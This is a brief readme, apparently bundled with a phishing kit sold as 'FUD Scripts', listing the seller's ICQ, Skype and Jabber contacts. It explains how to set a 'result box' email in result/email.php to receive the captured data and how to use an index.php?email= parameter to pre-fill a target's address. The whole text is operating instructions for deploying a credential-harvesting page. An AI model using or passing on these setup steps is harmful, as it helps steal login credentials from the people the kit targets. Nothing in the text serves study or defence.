.:\FUD Scripts/:.
ICQ ID: 729651180
Skype: elmerosor (Onye Mpa X)
Jabber: mpa@creep.im


FOR RESULT BOX:
Open folder "result" folder. Locate "email.php" file and edit accordingly.
$webMaster = 'change value to your result box email';

FOR AUTO LINK FUNCTION:
Add "index.php?email=email@address.com" to your file location.